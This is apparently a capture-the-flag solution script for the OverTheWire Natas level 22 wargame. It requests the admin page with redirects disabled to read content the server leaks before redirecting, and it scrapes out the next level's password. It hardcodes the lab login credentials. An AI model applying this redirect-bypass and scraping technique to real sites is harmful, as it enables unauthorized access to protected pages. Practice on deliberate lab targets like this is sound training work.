import re, requests
USER = 'natas22'
PASS = 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz'
URL = f'http://{USER}.natas.labs.overthewire.org/?revelio'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
burp = {"http": "http://127.0.0.1:8080"}
header = {"Location": "/?revelio"}

request = requests.get(url=URL, auth=auth_basic, headers=header, allow_redirects=False)
response_http = request.text
if 'You are an admin' in response_http:
    flag = str(re.search(r'Password:[^:]+<', response_http))
    password = flag.split(':')[1][1: -8]
    print('The password for natas23 is:', password)